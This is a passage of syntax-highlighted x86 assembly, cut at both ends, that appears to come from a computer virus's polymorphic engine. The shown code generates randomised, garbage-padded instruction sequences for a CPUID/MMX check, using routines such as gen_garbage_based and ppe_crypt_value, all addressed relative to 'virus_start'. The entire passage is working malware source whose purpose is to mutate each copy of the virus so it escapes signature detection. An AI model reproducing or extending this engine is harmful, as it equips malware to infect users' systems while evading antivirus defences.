        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;   JNC NOT_CPUID</span><span class="sc0">
        </span><span class="sc1">;   MOV EAX,00000001h       ;crypted EAX</span><span class="sc0">
        </span><span class="sc1">;   CPUID               ;check if MMX</span><span class="sc0">
        </span><span class="sc1">;   BT  EDX,23          ;test 23rd bit</span><span class="sc0">
        </span><span class="sc1">;  NOT_CPUID:               ;result in (Z)ero</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Using CPUID (only for MMX suport):</span><span class="sc0">
        </span><span class="sc1">;   * EAX=00000001h + CPUID (0Fh, 0A2h)</span><span class="sc0">
        </span><span class="sc1">;   * and EAX,EDX will be fill,</span><span class="sc0">
        </span><span class="sc1">;     EDX[23]=CPU supports IA-MMX, EDX[24]=IA-MMX 2 support</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;This function is very crazy rather - I think.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__cm_stack_out</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;main_reg32 is in stack ?</span><span class="sc0">
        </span><span class="sc5">__cm_main_reg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;where we have EFLAGS</span><span class="sc0">
        </span><span class="sc5">__cm_slave_reg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;helping reg32</span><span class="sc0">
        </span><span class="sc5">__cm_start_jump</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;global disable test</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__cpuid_mmx</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; test, if our poly-engine don't support MMX for file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copro_or_mmx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cm_prepare</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">         </span><span class="sc1">;CLC instruction</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cm_after_test</span><span class="sc0">

        </span><span class="sc1">; the first we test if CPU supports CPUID</span><span class="sc0">
    </span><span class="sc5">__cm_prepare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_stack_out</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Ch</span><span class="sc0">          </span><span class="sc1">;PUSHF instruction</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; POP reg32 + test</span><span class="sc0">
    </span><span class="sc5">__cm_part_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;save EFLAGS to reg32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;POP reg32</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;(OR) || (BTC,BTS,...) ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cmp1_type_2</span><span class="sc0">

        </span><span class="sc1">; select type of detect</span><span class="sc0">
    </span><span class="sc5">__cmp1_type_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;from reg32 or operand ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cmp1t1_type_2</span><span class="sc0">

        </span><span class="sc1">; we'll generate (1 shl 21) to reg32 and set flag</span><span class="sc0">
    </span><span class="sc5">__cmp1t1_type_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_slave_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">21d</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">     </span><span class="sc1">;get (1 shl 21) to reg32</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cmp1t1t1_type_2</span><span class="sc0">

        </span><span class="sc1">; OR main_reg32, reg32</span><span class="sc0">
    </span><span class="sc5">__cmp1t1t1_type_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">
        </span><span class="sc5">__cmp1t1t1_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_slave_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cm_part_2</span><span class="sc0">

        </span><span class="sc1">; ADD main_reg32, reg32</span><span class="sc0">
    </span><span class="sc5">__cmp1t1t1_type_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cmp1t1t1_after</span><span class="sc0">

        </span><span class="sc1">; select type of detect</span><span class="sc0">
    </span><span class="sc5">__cmp1t1_type_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cmp1t1t2_type_2</span><span class="sc0">

        </span><span class="sc1">; OR main_reg32, 1 shl 21</span><span class="sc0">
    </span><span class="sc5">__cmp1t1t2_type_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C881h</span><span class="sc0">
        </span><span class="sc5">__cmp1t1t2_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">21d</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cm_part_2</span><span class="sc0">

        </span><span class="sc1">; ADD main_reg32, 1 shl 21</span><span class="sc0">
    </span><span class="sc5">__cmp1t1t2_type_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cmp1t1t2_after</span><span class="sc0">

        </span><span class="sc1">; new type of instructions + gen 21 to reg + set flag</span><span class="sc0">
    </span><span class="sc5">__cmp1_type_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cmp1t2_type_2</span><span class="sc0">

        </span><span class="sc1">; generate number 21 to reg32</span><span class="sc0">
    </span><span class="sc5">__cmp1t2_type_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_slave_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">21d</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0AB0Fh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_slave_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cm_part_2</span><span class="sc0">

        </span><span class="sc1">; use 21 directly</span><span class="sc0">
    </span><span class="sc5">__cmp1t2_type_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0BA0Fh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">15E8h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cm_part_2</span><span class="sc0">

        </span><span class="sc1">; end of part one, test CPUID support</span><span class="sc0">
    </span><span class="sc5">__cm_part_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">          </span><span class="sc1">;PUSH main_reg32, POPF</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Dh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc1">; enable registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; get result from EFLAGS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_slave_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Ch</span><span class="sc0">          </span><span class="sc1">;PUSHF + POP main_reg32</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc1">; select type of instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;I don't support TEST, AND</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">   </span><span class="sc1">;instruction 'cause it</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;gives a result in (Z)ero</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cmp2_type_2</span><span class="sc0">       </span><span class="sc1">;and the others in (C)arry</span><span class="sc0">

        </span><span class="sc1">; BT, BTC, BTR, BTS instruction</span><span class="sc0">
    </span><span class="sc5">__cmp2_type_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;use reg32 or diect value ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cmp2t1_type_2</span><span class="sc0">

        </span><span class="sc1">; generate 21 number to the empty reg32</span><span class="sc0">
    </span><span class="sc5">__cmp2t1_type_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_slave_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_COPRO</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cmp2t1_type_1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">21d</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">;1st byte of b-instructions</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc1">; use reg32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_bt_reg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_bt_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_bt_imm</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_slave_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A3h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cm_part_3</span><span class="sc0">

        </span><span class="sc1">; use the direct value</span><span class="sc0">
    </span><span class="sc5">__cmp2t1_type_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">;1st byte of b-instructions</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_bt_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_bt_imm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_bt_imm</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BAh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">21d</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cm_part_3</span><span class="sc0">

        </span><span class="sc1">; RCL, RCR, ROL, ROR, SHL, SHR instructions</span><span class="sc0">
        </span><span class="sc1">; I don't support SAR instruction (it's not opposite)</span><span class="sc0">
    </span><span class="sc5">__cmp2_type_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_rs_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_rs_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_rs_imm</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc1">; rotate/shift - right/left ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
